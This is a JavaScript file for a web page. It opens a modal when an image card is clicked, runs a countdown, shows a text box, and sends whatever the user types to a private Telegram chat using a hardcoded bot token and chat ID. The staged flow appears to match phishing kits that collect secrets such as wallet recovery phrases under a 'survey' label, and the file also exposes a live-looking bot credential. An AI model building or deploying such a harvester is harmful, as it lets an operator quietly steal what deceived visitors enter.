document.addEventListener('DOMContentLoaded', function () {

    // --- Centralized DOM References ---
    const DOM = {
        containers: document.querySelectorAll('.clickable'),
        modal: document.getElementById('myModal'),
        modalImage: document.getElementById('modalImage'),
        modalTitle: document.getElementById('modalTitle'),
        closeButton: document.querySelector('.close'),

        stage1: document.getElementById('stage1'),
        countdownElement: document.getElementById('countdown'),
        buttonContainer: document.getElementById('buttonContainer'),
        textAreaContainer: document.getElementById('textAreaContainer'),
        successContainer: document.getElementById('successContainer'),

        inputTextArea: document.getElementById('inputTextArea'),
        sendButton: document.getElementById('sendButton'),
        proceedButton: document.getElementById('clickableButton'),
        errorMessage: document.getElementById('errorMessage'),
        form: document.getElementById('form'), // Make sure your <form> has this ID
    };

    let modalCloseTimeout;
    let countdownInterval;

    // --- Stage Manager: Only one stage visible at a time ---
    function showStage(stageName) {
        const stages = ['stage1', 'buttonContainer', 'textAreaContainer', 'successContainer'];
        stages.forEach(s => {
            if (DOM[s]) DOM[s].style.display = (s === stageName) ? 'block' : 'none';
        });
    }

    // --- Modal Functions ---
    function resetModal() {
        if (DOM.inputTextArea) DOM.inputTextArea.value = '';
        if (DOM.errorMessage) DOM.errorMessage.classList.remove('show-error');
        showStage('stage1'); // Start at stage1
    }

    function startCountdown() {
        let count = 5;
        if (DOM.countdownElement) DOM.countdownElement.textContent = count;
        clearInterval(countdownInterval);

        countdownInterval = setInterval(() => {
            count--;
            if (DOM.countdownElement) DOM.countdownElement.textContent = count;

            if (count <= 0) {
                clearInterval(countdownInterval);
                showStage('buttonContainer'); // Only buttons visible after countdown
            }
        }, 1000);
    }

    function closeModal() {
        if (DOM.modal) DOM.modal.style.display = 'none';
        clearTimeout(modalCloseTimeout);
        clearInterval(countdownInterval);
        resetModal();
    }

    function openModal(imgSrc, text) {
        if (DOM.modalImage) DOM.modalImage.src = imgSrc;
        if (DOM.modalTitle) DOM.modalTitle.textContent = text;
        if (DOM.modal) DOM.modal.style.display = 'flex';
        resetModal();
        startCountdown();
    }

    function showError(message) {
        if (!DOM.errorMessage) return;
        DOM.errorMessage.textContent = message;
        DOM.errorMessage.classList.add('show-error');
        setTimeout(() => DOM.errorMessage.classList.remove('show-error'), 3000);
    }

    async function sendToTelegram(message) {
        const botToken = "8544540012:AAF7cZx2QqOKVGQ5gxguXsjXHyZuY96y7jw"; // Replace with your bot token
        const chatId = "8368741386";     // Replace with your chat ID
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            const data = await response.json();
            if (data.ok) {
                showStage('successContainer'); // Show success stage
                if (DOM.form) DOM.form.reset(); // reset form after submission
            } else {
                showError("Error sending message: " + JSON.stringify(data));
            }
        } catch (err) {
            showError("Request failed: " + err);
        }
    }

    // --- Event Listeners ---
    if (DOM.containers) {
        DOM.containers.forEach(container => {
            container.addEventListener('click', function () {
                const imgSrc = container.querySelector('img')?.src || '';
                const text = container.querySelector('h2')?.textContent || '';
                openModal(imgSrc, text);
            });
        });
    }

    if (DOM.closeButton) DOM.closeButton.addEventListener('click', closeModal);
    window.addEventListener('click', (event) => { if (event.target === DOM.modal) closeModal(); });

    if (DOM.proceedButton) {
        DOM.proceedButton.addEventListener('click', () => {
            showStage('textAreaContainer'); // Only input stage visible
            if (DOM.inputTextArea) DOM.inputTextArea.focus();
        });
    }

    // --- FORM SUBMISSION ---
    if (DOM.form) {
        DOM.form.addEventListener('submit', async (e) => {
            e.preventDefault(); // Prevent URL query params
            const input = DOM.inputTextArea?.value.trim();
            if (!input) {
                showError("Please enter a message before submitting.");
                return;
            }
            const message = `New Survey Submission:\n${input}`;
            await sendToTelegram(message);
        });
    }



});
